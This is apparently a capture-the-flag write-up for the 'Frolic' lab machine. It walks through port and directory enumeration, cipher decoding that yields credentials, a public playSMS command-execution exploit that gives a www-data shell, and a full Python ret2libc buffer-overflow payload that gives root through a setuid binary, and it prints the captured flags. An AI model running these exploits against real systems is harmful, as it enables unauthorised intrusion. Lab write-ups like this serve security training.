# Frolic
>Author : Xyan1d3
>Date : 9th July 2021
>IP : 10.10.10.111
>OS : Linux
>Difficulty : Easy
# Initial Enumeration
## Nmap
```sql
# Nmap 7.91 scan initiated Fri Jul  9 14:24:06 2021 as: nmap -sC -sV -v -oN nmap/frolic 10.10.10.111
Nmap scan report for forlic.htb (10.10.10.111)
Host is up (0.079s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 87:7b:91:2a:0f:11:b6:57:1e:cb:9f:77:cf:35:e2:21 (RSA)
|   256 b7:9b:06:dd:c2:5e:28:44:78:41:1e:67:7d:1e:b7:62 (ECDSA)
|_  256 21:cf:16:6d:82:a4:30:c3:c6:9c:d7:38:ba:b5:02:b0 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
9999/tcp open  http        nginx 1.10.3 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Welcome to nginx!
Service Info: Host: FROLIC; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -1h49m51s, deviation: 3h10m30s, median: 7s
| nbstat: NetBIOS name: FROLIC, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   FROLIC<00>           Flags: <unique><active>
|   FROLIC<03>           Flags: <unique><active>
|   FROLIC<20>           Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  WORKGROUP<1e>        Flags: <group><active>
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: frolic
|   NetBIOS computer name: FROLIC\x00
|   Domain name: \x00
|   FQDN: frolic
|_  System time: 2021-07-09T14:24:29+05:30
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-07-09T08:54:29
|_  start_date: N/A
```

## Gobuster on port `9999`
```python
┌─[Magisk@Xyan1d3]─[10.10.14.18]─[~/htb/frolic]
└──╼ # gobuster dir -u http://10.10.10.111:9999/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.out -x php,txt -t 500                       
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.111:9999/
[+] Method:                  GET
[+] Threads:                 500
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
2021/07/09 14:27:40 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/admin/]
/test                 (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/test/]
/dev                  (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/dev/]
/backup               (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/backup/]
/loop                 (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/loop/]
```

We check the `/backup/` directory and find out some file names like `password.txt` and `user.txt`.
From, There we get a credential pair.
![[Pasted image 20210709161812.png]]

|Username|Password|
|--|--|
|admin|imnothuman|

We visit the `/admin/` and find out that we have a login page which gives us a javascript alert box everytime we enter a wrong credential. It counts for number of attempts `3`. Which gets reset if we refresh the page.
![[Pasted image 20210709161926.png]]

So, We may check the javascript of this page.
![[Pasted image 20210709163352.png]]

We see that there is a hardcoded credentials on the `login.js`.
![[Pasted image 20210709163725.png]]

We see something that looks like a cipher.
![[Pasted image 20210709163851.png]]

It is a `OOK!` cipher which we could use an online decoder to decode.
On decoding it gives us an web directory which we could access on the website.
![[Pasted image 20210709164046.png]]

Decoded text : `Nothing here check /asdiSIAJJ0QWE9JAS`

We visit the site and find out some cipher which looks like a `base64`.
We could paste it on `cyberchef`.
![[Pasted image 20210709165522.png]]

It turns out that it is a `PKZIP` file which we could download from there and save it.
But, It turns out that it is encrypted.
The zip passwor is : `password`

We unzip it and find an `index.php` which has some cipher that looks like hex.
![[Pasted image 20210709173647.png]]

We decode it and find out that it decodes from `hex` , `base64`, `brainfuck`.
![[Pasted image 20210709175157.png]]
![[Pasted image 20210709175225.png]]

We get a password : `idkwhatispass`.

We visit the `http://10.10.10.111:9999/backup/dev/` and find out that it shows a webdirectory called `/playsms/`.
![[Pasted image 20210709190832.png]]

We visit the `http://10.10.10.111:9999/playsms` and find out a login page.
![[Pasted image 20210709190921.png]]

The credential `admin` and `idkwhatispass` works on the `playsms` and we get logged in.

# Initial Foothold as www-data
The playsms here is vulnerable to `import.php` csv command execution.
Exploit : https://www.exploit-db.com/exploits/42044

We will be using an automated exploit from github.
Exploit : https://github.com/jasperla/CVE-2017-9101
![[Pasted image 20210709211637.png]]
```python
┌─[Magisk@Xyan1d3]─[10.10.14.18]─[~/htb/frolic/CVE-2017-9101]
└──╼ # python3 playsmshell.py --username admin --password idkwhatispass --url http://10.10.10.111:9999/playsms --interactive
[*] Grabbing CSRF token for login
[*] Attempting to login as admin
[+] Logged in!
[*] Grabbing CSRF token for phonebook import
[+] Entering interactive shell; type "quit" or ^D to quit
> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We could use it to get a proper reverse shell.
![[Pasted image 20210709211755.png]]

## Getting user Flag
```python
www-data@frolic:~$ cd /home/ayush/
www-data@frolic:/home/ayush$ ls -l
total 4
-rwxr-xr-x 1 ayush ayush 33 Sep 25  2018 user.txt
www-data@frolic:/home/ayush$ cat user.txt 
2ab95909cf509f85a6f476b59a0c2fe0
```

# Root Escalation
We check for the setuid binaries on the box and find out that we have a custom binary on the box.
```python
www-data@frolic:~$ find / -perm /4000 2> /dev/null

*** SNIP ***

/home/ayush/.binary/rop

*** SNIP ***

```
We check for `ASLR` on the box and find out that it is turned off.
![[Pasted image 20210709234816.png]]

We transfer the binary on the box and run a `checksec` against it and find out some important characteristics.
![[Pasted image 20210709235042.png]]

We see that the binary has `ASLR` disabled and `NX` bit enabled which states that we cannot put shellcode on the stack and jump to it.
Therefore, We could have to retort to our classic ret2libc.

We could generate a custom pattern of a length of `200` and put it on the 1st parameter on the binary and execute it to check the location of the crash.
We use `msf-pattern_create` to generate a payload of `200` length.
![[Pasted image 20210709235444.png]]

We run the binary on `gdb` with the string as a parameter.
![[Pasted image 20210709235555.png]]

We see that we have a crash and now we can use `msf-pattern_offset` to find the length of the buffer.
![[Pasted image 20210709235647.png]]

We see that we have the buffer size of `52` after which we control the `$eip`.

We could now use `readelf -s` to get the `system` and `exit` offset from the `libc.so.6` and `/bin/sh` address by doing a `strings -atx` on `libc.so.6`.

The Exploit Code:
```python
import struct
import os

libc = 0xb7e19000
sys_offset = 0x0003ada0
sh_offset = 0x0015ba0b
exit_offset = 0x0002e9d0

sys_addr = libc + sys_offset
sh_addr = libc + sh_offset
exit_addr = libc + exit_offset

payload = "A"*52

payload += struct.pack("<I" , sys_addr)
payload += struct.pack("<I" , exit_addr)
payload += struct.pack("<I" , sh_addr)

print(payload)
```

We could now run this exploit and get a root shell on the box.
![[Pasted image 20210709235946.png]]

## Getting the root Flag
```python
root@frolic:/dev/shm# cd /root/
root@frolic:/root# ls -l
total 4
-rw------- 1 root root 33 Sep 25  2018 root.txt
root@frolic:/root# cat root.txt 
85d3fdf03f969892538ba9a731826222
```
# Credentials
|Username|Password|Found from|
|--|--|--|
|admin|imnothuman|backup web directory|
| |idkwhatispass|from decoding ciphers on /admin|
